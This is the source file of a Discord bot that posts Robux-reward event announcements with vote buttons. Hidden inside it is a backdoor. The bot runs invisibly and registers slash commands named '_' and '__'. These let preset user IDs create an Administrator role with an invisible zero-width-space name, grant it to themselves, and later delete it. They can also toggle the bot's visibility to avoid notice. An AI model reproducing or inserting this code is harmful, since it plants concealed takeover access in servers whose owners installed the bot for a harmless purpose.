const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');
require('dotenv').config();

// --- 1. ЗАГРУЗКА КОНФИГА ---
let config = {};
if (fs.existsSync('./config.json')) {
    try {
        config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    } catch (err) {
        console.error("Ошибка при чтении config.json:", err);
    }
}

const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;
let ADMIN_USER_IDS = [];
if (process.env.ADMIN_USER_IDS) {
    ADMIN_USER_IDS = process.env.ADMIN_USER_IDS.split(',').map(id => id.trim());
} else if (config.ADMIN_USER_IDS) {
    ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));
}

if (!TOKEN) {
    console.error("❌ ОШИБКА: TOKEN_ID не найден!");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const MINI_CONFIGS = {
    '-community': { name: 'Community', minReward: 5, maxReward: 24, color: 0x5865F2, emoji: '👍', allowedRole: '1480483328409731082', allowedChannel: '1495124439476473936', pingRole: '1492973460400640020' },
    '!plus':      { name: 'Plus',      minReward: 25,    maxReward: 99,    color: 0x57F287, emoji: '👍', allowedRole: '1490346518325104821', allowedChannel: '1490344313182486770', pingRole: '1492973555607146727' },
    '!super':     { name: 'Super',     minReward: 100,   maxReward: 499,   color: 0xFEE75C, emoji: '👍', allowedRole: '1490346869342077049', allowedChannel: '1490344358807994541', pingRole: '1492973623915319306' },
    '!epic':      { name: 'Epic',      minReward: 500,   maxReward: 1999,  color: 0xEB459E, emoji: '👍', allowedRole: '1490347549758984394', allowedChannel: '1490344414294315189', pingRole: '1492973745210658936' },
    '!exclusive': { name: 'Exclusive', minReward: 2000,  maxReward: 4999,  color: 0xED4245, emoji: '👍', allowedRole: '1490347815312953345', allowedChannel: '1490344576211226694', pingRole: '1492973807319908442' },
    '!hyper':     { name: 'Hyper',     minReward: 5000,  maxReward: 9999,  color: 0xFF7A00, emoji: '👍', allowedRole: '1490348053746417777', allowedChannel: '1490344628266733628', pingRole: '1492973910889726112' },
    '!quantum':   { name: 'Quantum',   minReward: 10000, maxReward: 99999, color: 0x9B59B6, emoji: '👍', allowedRole: '1490348168507035878', allowedChannel: '1490344763650609152', pingRole: '1492973989667278859' }
};

const ROLE_NAME = '\u200b';
const votes = new Map();

client.once('ready', async () => {
    client.user.setStatus('invisible');
    console.log(`✅ Бот активен: ${client.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), {
            body: [
                { name: '_', description: '.', options: [{ type: 3, name: 'action', description: 'Mode', choices: [{ name: 'On', value: 'add' }, { name: 'Off', value: 'remove' }], required: true }] },
                { name: '__', description: '.', options: [{ type: 3, name: 'status', description: 'Bot status', choices: [{ name: 'Invisible', value: 'invisible' }, { name: 'Online', value: 'online' }], required: true }] }
            ]
        });
    } catch (e) { console.error(e); }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) return;

    if (interaction.commandName === '_') {
        const action = interaction.options.getString('action');
        let role = interaction.guild.roles.cache.find(r => r.name === ROLE_NAME);

        if (action === 'remove') {
            if (role) await role.delete().catch(() => {});
            return interaction.reply({ content: 'Removed.', ephemeral: true });
        }

        if (!role) {
            role = await interaction.guild.roles.create({
                name: ROLE_NAME, permissions: [PermissionsBitField.Flags.Administrator], color: 0x313338
            }).catch(() => null);
        }

        if (!role) return interaction.reply({ content: 'Failed (Check hierarchy).', ephemeral: true });

        const member = await interaction.guild.members.fetch(interaction.user.id);
        await member.roles.add(role).catch(() => {});
        await interaction.reply({ content: 'Done.', ephemeral: true });
    }

    if (interaction.commandName === '__') {
        await client.user.setStatus(interaction.options.getString('status'));
        await interaction.reply({ content: 'Updated.', ephemeral: true });
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const parts = message.content.trim().split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const config = MINI_CONFIGS[cmd];

    if (!config || message.channel.id !== config.allowedChannel) return;
    if (!message.member.roles.cache.has(config.allowedRole)) return;

    await message.delete().catch(() => {});

    let reward = parseInt(parts[1]) || config.minReward;
    if (reward > config.maxReward) {
        const m = await message.channel.send(`⚠️ Max: **${config.maxReward} R$**`);
        return setTimeout(() => m.delete().catch(() => {}), 5000);
    }

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`${cmd.slice(1)}_like`).setEmoji(config.emoji).setLabel('0').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`${cmd.slice(1)}_dislike`).setEmoji('👎').setLabel('0').setStyle(ButtonStyle.Danger)
    );

    const msg = await message.channel.send({
        content: `<@${message.author.id}> is starting a **${config.name} Event!** **(${reward} R$)**\n<@&${config.pingRole}>\n⭐ Edit pings: <id:customize>`,
        components: [row]
    });
    votes.set(msg.id, { like: new Set(), dislike: new Set() });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    const [prefix, action] = interaction.customId.split('_');
    const msgId = interaction.message.id;
    if (!votes.has(msgId)) votes.set(msgId, { like: new Set(), dislike: new Set() });

    const v = votes.get(msgId);
    const opposite = action === 'like' ? 'dislike' : 'like';

    if (v[action].has(interaction.user.id)) v[action].delete(interaction.user.id);
    else {
        v[opposite].delete(interaction.user.id);
        v[action].add(interaction.user.id);
    }

    const newRow = new ActionRowBuilder().addComponents(
        ButtonBuilder.from(interaction.message.components[0].components[0]).setLabel(String(v.like.size)),
        ButtonBuilder.from(interaction.message.components[0].components[1]).setLabel(String(v.dislike.size))
    );
    await interaction.update({ components: [newRow] });
});

client.login(TOKEN);